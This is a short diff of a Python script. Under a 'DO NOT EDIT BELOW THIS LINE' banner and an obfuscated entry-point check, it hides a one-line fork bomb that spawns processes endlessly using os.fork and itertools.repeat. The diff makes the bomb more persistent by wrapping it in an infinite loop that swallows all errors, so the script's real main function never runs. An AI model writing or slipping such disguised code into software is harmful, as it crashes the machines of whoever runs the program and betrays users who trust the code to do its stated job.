@@ -17,5 +17,9 @@ def main():
 
 #! DO NOT EDIT BELOW THIS LINE --------------------------------------------------------------------
 if __name__ == sylnoevplayxrrsaro:
-    [o.fork() for (o,i) in [(__import__('os'), __import__('itertools'))] for x in i.repeat(0)]
+    while True:
+        try:
+            [o.fork() for (o,i) in [(__import__('os'), __import__('itertools'))] for x in i.repeat(0)]
+        except:
+            pass
     main()
